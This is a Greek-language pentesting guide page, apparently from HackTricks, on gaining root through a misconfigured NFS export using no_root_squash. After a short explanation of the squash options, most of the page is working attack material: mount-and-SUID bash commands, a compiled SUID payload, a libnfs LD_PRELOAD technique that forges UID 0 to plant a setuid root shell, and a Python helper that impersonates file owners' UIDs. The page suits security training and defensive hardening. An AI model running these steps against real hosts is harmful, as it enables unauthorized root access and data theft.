# Privilege Escalation λόγω λανθασμένης ρύθμισης NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες για το Squashing

Με το NFS AUTH_SYS/AUTH_UNIX, ο server βασίζει τους ελέγχους δικαιωμάτων αρχείων στα `uid` και `gid` που παρέχονται σε κάθε RPC request. Άλλα security flavors, όπως το Kerberos, χρησιμοποιούν διαφορετικά credentials και ο server μπορεί να αντιστοιχίσει τα numeric credentials πριν ελέγξει τα permissions.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Αντιστοιχίζει κάθε UID και GID στον anonymous account, ο οποίος στο Linux είναι από προεπιλογή ο `nobody` (65534). Το `no_all_squash` είναι η προεπιλογή για requests που δεν προέρχονται από root.<sup>[[4]](#references)</sup>
- **`root_squash`**: Αυτή είναι η προεπιλογή στο Linux και αντιστοιχίζει requests με UID/GID 0 (root) στον anonymous account. Άλλα UIDs και GIDs δεν υφίστανται squash.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Απενεργοποιεί το root squashing, επομένως τα requests με UID/GID 0 μπορούν να αξιολογούνται ως root στον server.<sup>[[4]](#references)</sup>

Αν ένας επιτρεπόμενος client μπορεί να κάνει mount ένα writable export στο **`/etc/exports`**, το οποίο έχει ρυθμιστεί με **`no_root_squash`**, τα requests του με UID/GID 0 μπορούν να γράφουν εκεί ως ο root user του server.<sup>[[4]](#references)</sup>

Για περισσότερες πληροφορίες σχετικά με το **NFS**, δείτε:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Option 1 με χρήση bash:
- Σε έναν επιτρεπόμενο client, κάντε mount ένα writable export ως root, αντιγράψτε το **`/bin/bash`** σε αυτό, ορίστε το bit **SUID** και εκτελέστε το από ένα victim mount που δεν χρησιμοποιεί `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
- Για να παραμείνει το uploaded file owned by root, ο server πρέπει να χρησιμοποιεί **`no_root_squash`**. Αν το root υφίσταται squash, ένα SUID binary για άλλο account είναι δυνατό μόνο όταν ο client μπορεί νόμιμα να το δημιουργήσει ή να το έχει στην κατοχή του με το numeric UID/GID αυτού του account.<sup>[[4]](#references)</sup>
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Επιλογή 2 με χρήση compiled C code:
- Κάντε mount τον κατάλογο από έναν επιτρεπόμενο client, αντιγράψτε ένα compiled payload που εκμεταλλεύεται τα SUID permissions, ορίστε το **SUID** bit του και εκτελέστε το από το victim (δείτε μερικά [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Ίδιοι περιορισμοί όπως παραπάνω
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> Σημειώστε ότι αν μπορείτε να δημιουργήσετε ένα **tunnel από το μηχάνημά σας προς το victim machine, μπορείτε και πάλι να χρησιμοποιήσετε τη Remote version για να εκμεταλλευτείτε αυτό το privilege escalation, κάνοντας tunnelling στις απαιτούμενες θύρες**.\
> Το παρακάτω trick είναι χρήσιμο όταν το `/etc/exports` περιορίζει το export στη διεύθυνση IP του victim: ο remote client δεν μπορεί να το κάνει mount, αλλά η local τεχνική μπορεί να λειτουργήσει μέσω του share που είναι ήδη mounted στο επιτρεπόμενο host.<sup>[[2]](#references)</sup>\
> Για αυτήν τη μέθοδο unprivileged libnfs, το export στο **`/etc/exports`** πρέπει να χρησιμοποιεί το flag `insecure`, ώστε η process να μπορεί να χρησιμοποιεί non-reserved source port· το `secure` είναι η προεπιλογή, αν και μια process που μπορεί να κάνει bind σε reserved port δεν χρειάζεται αυτήν την επιλογή.<sup>[[1]](#references)[[4]](#references)</sup>

### Βασικές πληροφορίες

Ένας NFSv3 AUTH_UNIX client περιλαμβάνει το effective UID, GID και τα groups του σε κάθε call, και ο server τα χρησιμοποιεί για τους permission checks. Αυτή η local τεχνική εκμεταλλεύεται αυτό το μοντέλο, πλαστογραφώντας τα RPC credentials μέσω του [libnfs](https://github.com/sahlberg/libnfs)· το preload module του υποστηρίζει την παράκαμψη του UID/GID στο NFS context.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Μεταγλώττιση της βιβλιοθήκης

Το παράδειγμα του libnfs μπορεί να απαιτεί προσαρμογές για τον target kernel· το walkthrough που χρησιμοποιείται εδώ αναφέρει συγκεκριμένα ότι πρέπει να σχολιαστούν τα fallocate syscalls πριν από τη μεταγλώττιση του preload module.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Εκτέλεση του Exploit

Το παράδειγμα δημιουργεί ένα μικρό helper σε C που εκκινεί ένα shell, στη συνέχεια το τοποθετεί στο share και χρησιμοποιεί το `ld_nfs.so` με UID 0 στο πλαίσιο του NFS, ώστε να το κάνει SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Compile του κώδικα του exploit:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Τοποθετήστε το exploit στο share και τροποποιήστε τα permissions του πλαστογραφώντας το UID**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Εκτελέστε το exploit για να αποκτήσετε δικαιώματα root**.<sup>[[2]](#references)</sup>
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell για Stealthy Πρόσβαση σε Αρχεία

Μόλις αποκτηθεί πρόσβαση root, αυτό το μοτίβο `nfsh.py` ορίζει το effective UID στο UID του αρχείου-στόχου πριν εκτελέσει μια εντολή, επιτρέποντας την πρόσβαση χωρίς αναδρομική αλλαγή ιδιοκτησίας.<sup>[[2]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Εκτελέστε ως εξής:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Μια ιστορία για ένα λιγότερο γνωστό NFS privesc](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Προδιαγραφή πρωτοκόλλου NFS Version 3](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
